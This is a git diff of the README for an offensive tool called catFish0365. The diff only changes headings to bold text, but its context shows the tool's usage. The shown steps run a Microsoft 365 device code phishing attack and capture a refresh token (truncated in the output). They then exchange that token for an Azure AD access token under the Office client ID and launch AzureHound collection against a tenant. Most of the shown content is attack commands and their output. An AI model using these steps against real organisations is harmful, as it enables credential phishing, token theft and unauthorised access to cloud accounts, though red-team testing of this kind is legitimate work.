@@ -37,7 +37,7 @@ Run "catFish0365 <command> --help" for more information on a command.
 catFish0365: error: expected one of "exploitdcauth",  "getaccesstoken"
 ```
 
-### To perform the device code phishing attack
+**To perform the device code phishing attack**
 ```shell
 ./catFish0365 exploitdcauth
 10 Apr 2023 17:41:52 INF [*] Generating a new user code
@@ -58,7 +58,7 @@ catFish0365: error: expected one of "exploitdcauth",  "getaccesstoken"
 10 Apr 2023 17:43:31 INF [+] Refresh Token => 0.AT[...]hoK4
 ```
 
-### To get a new Azure AD access token for the given clientid `d3590ed6-52b3-4102-aeff-aad2292ab01c` (Microsoft Office) and resource `https://graph.windows.net` using the given refresh token 
+**To get a new Azure AD access token for the given clientid `d3590ed6-52b3-4102-aeff-aad2292ab01c` (Microsoft Office) and resource `https://graph.windows.net` using the given refresh token**
 ```shell
  ./catFish0365 getaccesstoken 0.AT[...]hoK4
 10 Apr 2023 17:58:45 INF [*] Getting a new access token for the given resource: https://graph.windows.net
@@ -67,7 +67,7 @@ catFish0365: error: expected one of "exploitdcauth",  "getaccesstoken"
 10 Apr 2023 17:58:46 INF [+] Refresh Token => 0.AT[...]e3QY
 ```
 
-### To start [azurehound](https://github.com/BloodHoundAD/AzureHound) data collection using the acquired refresh token
+**To start [azurehound](https://github.com/BloodHoundAD/AzureHound) data collection using the acquired refresh token**
 ```shell
 azurehound.exe list --tenant "contoso.com" -r 0.AT[...]hoK4  -o output.json
 AzureHound v1.2.0
